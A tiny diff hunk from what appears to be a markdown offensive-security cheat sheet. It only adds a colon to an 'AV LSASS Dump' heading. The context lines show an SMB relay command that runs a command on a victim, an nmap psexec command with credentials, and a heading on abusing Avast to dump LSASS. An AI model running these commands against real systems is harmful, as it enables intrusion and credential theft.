@@ -265,7 +265,7 @@ smbrelayx.py -h <Victim IP> -c "ipconfig"
 nmap --script smb-psexec.nse -script-args=smbuser=<username>, smbpass=<password>[,config=<config>] -p445 <hosts>
 ```
 
-## AV LSASS Dump
+## AV LSASS Dump:
 
 How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)
 
